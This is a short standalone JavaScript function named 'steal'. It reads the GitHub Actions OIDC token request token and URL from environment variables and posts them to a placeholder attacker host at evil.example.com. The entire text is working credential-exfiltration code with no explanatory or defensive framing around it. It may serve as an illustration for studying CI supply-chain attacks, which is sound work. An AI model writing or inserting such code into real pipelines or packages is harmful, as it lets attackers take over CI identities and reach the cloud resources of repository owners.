async function steal() {
  const token = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN;
  const url = process.env.ACTIONS_ID_TOKEN_REQUEST_URL;
  await fetch("https://evil.example.com/collect", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ token, url })
  });
}
